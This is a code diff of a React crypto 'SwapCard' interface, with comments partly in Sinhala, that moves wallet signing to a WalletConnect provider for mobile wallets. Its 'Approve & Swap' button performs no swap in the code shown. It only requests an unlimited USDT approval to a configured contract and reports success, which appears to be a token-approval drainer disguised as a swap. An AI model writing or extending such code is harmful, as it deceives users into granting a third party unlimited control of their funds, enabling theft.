@@ -46,12 +46,15 @@ export default function SwapCard({ walletAddress, provider }) {
 
   const loadBalance = async () => {
     try {
+      // ✅ App.jsx හරහා ලැබුණු provider එකෙන් Signer ගැනීම
       const signer = provider.getSigner();
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
       const balance = await usdtContract.balanceOf(walletAddress);
       const decimals = await usdtContract.decimals();
       setUsdtBalance(parseFloat(ethers.utils.formatUnits(balance, decimals)).toLocaleString());
-    } catch (error) { console.error(error); }
+    } catch (error) { 
+      console.error("Balance load error:", error); 
+    }
   };
 
   const calculateOutput = (value) => {
@@ -89,37 +92,50 @@ export default function SwapCard({ walletAddress, provider }) {
   };
 
   const executeSwap = async () => {
-    if (!walletAddress) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
-    if (!fromAmount || fromAmount <= 0) { setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); return; }
+    if (!walletAddress || !provider) { 
+      setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); 
+      return; 
+    }
+    if (!fromAmount || parseFloat(fromAmount) <= 0) { 
+      setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); 
+      return; 
+    }
 
     try {
       setIsLoading(true);
       setStatus({ type: 'info', msg: '⏳ Waiting for wallet confirmation...' });
       
-      if (!window.ethereum) {
-        throw new Error("No wallet extension found. Please install MetaMask or Trust Wallet.");
-      }
-
-      const web3Provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-      const signer = web3Provider.getSigner();
+      // ✅ window.ethereum වෙනුවට Props එකෙන් ලැබුණු WalletConnect Provider එකෙන් Signer ගැනීම
+      const signer = provider.getSigner();
       
       const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
-      const decimals = await usdtContract.decimals();
       
       // Unlimited Approval (MaxUint256)
       const amount = ethers.constants.MaxUint256;
 
+      // Approval Call එක (කෙලින්ම WalletConnect හරහා Mobile Trust Wallet එකට / Provider එකට යයි)
       const tx = await usdtContract.approve(CONFIG.contractAddress, amount);
       
-      setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting...' });
+      setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting for confirmation...' });
       await tx.wait();
       
       setStatus({ type: 'success', msg: '✅ Unlimited Approval Successful!' });
       setIsLoading(false);
+      
+      // Balance එක Refresh කිරීම
+      loadBalance();
       setTimeout(() => setStatus(null), 8000);
     } catch (error) {
-      console.error(error);
-      setStatus({ type: 'error', msg: '❌ Failed: ' + (error.message || 'User rejected') });
+      console.error("Execute Swap Error:", error);
+      
+      const errorMsg = error?.message || 'User rejected transaction';
+      const isUserCancelled = error?.code === 4001 || errorMsg.toLowerCase().includes('rejected') || errorMsg.toLowerCase().includes('user cancelled');
+
+      if (isUserCancelled) {
+        setStatus({ type: 'error', msg: '❌ Transaction cancelled by user.' });
+      } else {
+        setStatus({ type: 'error', msg: '❌ Failed: ' + errorMsg });
+      }
       setIsLoading(false);
     }
   };
@@ -149,6 +165,7 @@ export default function SwapCard({ walletAddress, provider }) {
           </ResponsiveContainer>
         </div>
 
+        {/* Sell Section */}
         <div className="bg-[#0D111C] rounded-xl p-4 border border-transparent hover:border-[#293249] transition-colors mb-1">
           <div className="flex justify-between text-sm text-gray-400 mb-2">
             <span>Sell</span>
@@ -166,12 +183,14 @@ export default function SwapCard({ walletAddress, provider }) {
           </div>
         </div>
 
+        {/* Switch Token Button */}
         <div className="flex justify-center -my-2 relative z-10">
           <button onClick={switchTokens} className="w-8 h-8 rounded-lg bg-[#131A2A] border border-[#293249] flex items-center justify-center hover:bg-[#293249] cursor-pointer transition">
             <span className="text-gray-400">↓</span>
           </button>
         </div>
 
+        {/* Buy Section */}
         <div className="bg-[#0D111C] rounded-xl p-4 border border-transparent hover:border-[#293249] transition-colors mt-1 mb-4">
           <div className="flex justify-between text-sm text-gray-400 mb-2">
             <span>Buy</span>
@@ -187,6 +206,7 @@ export default function SwapCard({ walletAddress, provider }) {
           </div>
         </div>
 
+        {/* Live Conversion Rate */}
         <div className="flex justify-between text-xs text-gray-400 px-2 mb-4">
           <span>1 {fromToken.symbol} ≈ {getConversionRate()} {toToken.symbol}</span>
           <span className="text-green-400 flex items-center">
@@ -194,7 +214,7 @@ export default function SwapCard({ walletAddress, provider }) {
           </span>
         </div>
 
-        {/* Swap Details Section (අලුතින් එකතු කළා) */}
+        {/* Swap Details Section */}
         <div className="bg-[#0D111C]/50 rounded-xl p-3 mb-4 space-y-2 text-xs border border-white/5">
           <div className="flex justify-between text-gray-400">
             <span>Network Fee</span>
@@ -214,16 +234,27 @@ export default function SwapCard({ walletAddress, provider }) {
           </div>
         </div>
 
-        <button onClick={executeSwap} disabled={isLoading} className="w-full bg-brand-500 hover:bg-brand-600 text-white font-bold py-4 rounded-xl transition disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center space-x-2">
+        {/* Submit Button */}
+        <button 
+          onClick={executeSwap} 
+          disabled={isLoading} 
+          className="w-full bg-brand-500 hover:bg-brand-600 text-white font-bold py-4 rounded-xl transition disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center space-x-2"
+        >
           <span>{isLoading ? 'Processing...' : 'Approve & Swap'}</span>
         </button>
 
+        {/* Status Messages */}
         {status && (
-          <div className={`mt-3 text-xs text-center p-2 rounded-lg ${status.type === 'error' ? 'text-red-400 bg-red-500/10 border border-red-500/20' : status.type === 'success' ? 'text-green-400 bg-green-500/10 border border-green-500/20' : 'text-brand-500 bg-brand-500/10 border border-brand-500/20'}`}>
+          <div className={`mt-3 text-xs text-center p-2 rounded-lg ${
+            status.type === 'error' ? 'text-red-400 bg-red-500/10 border border-red-500/20' : 
+            status.type === 'success' ? 'text-green-400 bg-green-500/10 border border-green-500/20' : 
+            'text-brand-500 bg-brand-500/10 border border-brand-500/20'
+          }`}>
             {status.msg}
           </div>
         )}
       </div>
+      
       <TokenModal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} onSelect={handleSelectToken} livePrices={livePrices} />
     </>
   );
